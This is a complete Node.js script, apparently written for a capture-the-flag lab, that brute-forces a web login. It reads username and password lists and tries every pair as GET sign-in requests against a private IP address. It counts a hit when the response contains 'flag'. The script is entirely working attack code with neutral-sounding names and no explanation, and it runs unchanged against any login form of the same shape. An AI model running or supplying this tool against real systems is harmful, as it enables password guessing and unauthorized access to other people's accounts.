#!/usr/bin/env node
import { readFile } from "node:fs/promises";

const CONFIG = {
  listAFile: "users.txt",
  listBFile: "passwords.txt",
  baseUrl: "http://10.11.200.34/"
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function readList(filePath) {
  const raw = await readFile(filePath, "utf8");
  return [...new Set(raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean))];
}

async function processPair(itemA, itemB) {
  const url = new URL(CONFIG.baseUrl);
  url.search = new URLSearchParams({
    page: "signin",
    username: itemA,
    password: itemB,
    Login: "Login",
  }).toString();

  const res = await fetch(url.toString(), {
    method: "GET",
    redirect: "manual",
    headers: { "User-Agent": "local-test-script" },
  });

  const body = await res.text();

  const ok = body.includes("flag");

  return {
    ok,
    detail: `HTTP ${res.status} (${body.length} bytes) for ${itemA}/${itemB}`,
  };
}

async function main() {
  const listA = await readList(CONFIG.listAFile);
  const listB = await readList(CONFIG.listBFile);

  let processed = 0;

  for (const a of listA) {
    for (const b of listB) {
      const result = await processPair(a, b);
      processed += 1;
      console.log(`[${processed}] ${result.ok ? "OK" : "FAIL"} - ${result.detail}`);
    }
  }

  console.log(`Done. Total processed: ${processed}`);
}

main().catch((err) => {
  console.error("Fatal error:", err.message);
  process.exit(1);
});
